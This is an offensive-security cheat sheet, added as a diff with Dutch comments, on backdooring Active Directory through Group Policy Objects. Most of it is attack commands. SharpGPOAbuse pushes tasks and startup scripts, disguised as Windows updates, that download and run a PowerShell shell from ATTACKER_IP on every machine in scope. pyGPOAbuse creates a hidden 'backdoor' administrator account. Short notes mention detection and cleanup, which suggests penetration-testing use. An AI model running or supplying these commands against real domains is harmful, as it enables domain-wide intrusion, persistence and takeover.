@@ -1,0 +1,32 @@
+# GPO Backdoor — Persistence via Group Policy Objects
+# Maak een scheduled task of startup script in een GPO
+# Wordt automatisch uitgevoerd op alle computers in de GPO scope
+#
+# === Vereisten ===
+# - GPO edit rechten (standaard: Domain Admins, GPO Creator Owners)
+# - Of GenericWrite op een GPO object
+#
+# === Voorbeelden ===
+
+# SharpGPOAbuse - Scheduled task via GPO
+.\SharpGPOAbuse.exe --AddComputerTask --TaskName "WindowsUpdate" --Author DOMAIN\admin --Command "cmd.exe" --Arguments "/c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')" --GPOName "Default Domain Policy"
+
+# SharpGPOAbuse - Immediate scheduled task (eenmalig)
+.\SharpGPOAbuse.exe --AddComputerTask --TaskName "SecurityPatch" --Author DOMAIN\admin --Command "cmd.exe" --Arguments "/c whoami > C:\temp\gpo.txt" --GPOName "VULNERABLE_GPO" --Force
+
+# SharpGPOAbuse - User startup script
+.\SharpGPOAbuse.exe --AddUserScript --ScriptName "update.bat" --ScriptContents "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')" --GPOName "Default Domain Policy"
+
+# GPOddity (Python) - GPO abuse
+python3 gpoddity.py -u USER -p 'PASS' -d DOMAIN -dc-ip DC_IP -gpo-id GPO_GUID -command 'cmd /c whoami'
+
+# pyGPOAbuse
+python3 pygpoabuse.py DOMAIN/USER:'PASS' -gpo-id "GPO_GUID" -dc-ip DC_IP -command 'cmd /c net user backdoor Password123! /add && net localgroup Administrators backdoor /add'
+
+# Verifieer GPO toewijzing
+powershell -c "Get-GPO -All | Select DisplayName,Id,ModificationTime"
+
+# Noot: GPO wijzigingen worden automatisch elke 90 minuten (+0-30 min) toegepast
+# Noot: gpupdate /force om direct toe te passen op een specifieke machine
+# Noot: Detectie: Event 5136 op GPO objecten, monitor SYSVOL wijzigingen
+# Noot: Opruimen: verwijder de task/script uit de GPO na de test
